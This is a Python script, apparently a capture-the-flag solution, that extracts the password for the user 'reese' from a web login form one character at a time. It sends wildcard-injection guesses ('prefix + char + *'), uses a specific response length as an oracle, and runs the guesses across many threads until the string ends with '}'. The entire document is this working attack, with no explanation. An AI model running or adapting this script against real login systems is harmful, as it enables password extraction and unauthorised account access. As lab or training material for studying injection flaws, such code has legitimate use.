import re
import sys
import threading
import requests

xstr = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$%&\'()+,-./:;<=>?@[\\]^_`~{|}"
xdata = re.findall(".{3}", xstr)
url = "http://" + sys.argv[1] + "/login"
pswd = ""

def run(xstr):
    global pswd
    for char in xstr:
        tmp = pswd + char + "*"
        print("Trying : %s" % tmp, end="\r")
        data = {"username": "reese", "password": tmp}
        r = requests.post(url, headers={"Connection": "close"}, data=data)
        if r.headers["Content-Length"] == "2586":
            pswd += char
            if pswd.endswith("}"):
                sys.exit()


while not pswd.endswith("}"):
    threads = []
    for site in xdata:
        thread = threading.Thread(target=run, args=(site,))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

print("\033c", end="")
print(pswd)
